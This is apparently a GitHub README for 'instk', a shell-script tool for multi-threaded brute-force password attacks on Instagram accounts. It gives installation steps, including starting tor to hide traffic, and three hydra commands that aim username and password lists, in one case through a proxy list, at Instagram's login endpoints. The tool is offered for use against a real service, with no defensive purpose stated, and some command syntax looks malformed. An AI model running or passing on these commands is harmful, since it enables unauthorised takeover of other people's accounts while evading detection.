# instk

Instk is an Shell Script to perform multi-threaded brute force attack against Instagram


# Installation

git clone https://github.com/Khalidhusain786/instk.git

cd instk

chmod +x instkshell.sh

chmod +x install.sh

service tor start

./install.sh

bash instkshell.sh


# SCREENSHOT 

![CAPTURE 1](https://github.com/Khalidhusain786/instk/blob/main/khalid.jpg)



# HYDRA throw

hydra -l usernames.txt -P passwords.txt www.instagram.com http-post-form "/login/?next=/": "_username=^USER^&_password=^PASS^:F=incorrect" -V


hydra -L usernames.txt -P passwords.txt -x <proxy_list.txt> www.instagram.com http-post-form "/accounts/login/ajax/": "_username=^USER^&_password=^PASS^:F=incorrect" -V


hydra -L usernames.txt -P passwords.txt www.instagram.com http-post-form "/accounts/login/ajax/": "_username=^USER^&_password=^PASS^:F=incorrect" -V




